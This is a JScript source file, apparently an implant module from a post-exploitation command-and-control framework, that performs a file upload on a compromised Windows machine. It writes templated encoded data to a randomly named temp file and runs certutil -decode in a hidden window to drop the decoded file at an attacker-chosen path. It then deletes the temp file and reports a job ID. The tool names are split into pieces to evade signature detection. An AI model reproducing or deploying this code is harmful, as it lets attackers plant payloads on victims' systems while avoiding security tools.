uuid = function () {
    try {
        function random() {
            return Math.floor((1 + Math.random()) * 0x10000).toString(16).substring(1);
        }
        return random() + random() + '-' + random() + '-' + random() + '-' +
            random() + '-' + random() + random() + random();
    }
    catch (e) {
    }
}

writeTempFile = function (data) {
    fso1 = new ActiveXObject("Scripting.FileSystemObject");
    tempout = fso1.GetSpecialFolder(2) + "\\" + uuid() + ".t" + "xt";
    dataLines = data.split('|');
    f = fso1.CreateTextFile(tempout, true);
    for (i = 0; i < dataLines.length; i++) {
        f.WriteLine(dataLines[i]);
    }
    f.Close();
    return tempout;
}

deleteFile = function (pathname) {
    fso1 = new ActiveXObject("Scripting.FileSystemObject");
    f = fso1.GetFile(pathname);
    f.Delete();
}

job = function () {
    try {
        tempout = writeTempFile("~UPLOAD_DATA~");
        r = new ActiveXObject("WScript.Shell").Run("certut" + "il -decode " + tempout + " ~REMOTE_PATHNAME~ ", 0, true);
        deleteFile(tempout);
        return "[upload finish]";
    }
    catch (ex) {
        return "[upload fail]";
    }

}
c = "~JOB_ID~" + "|" + job();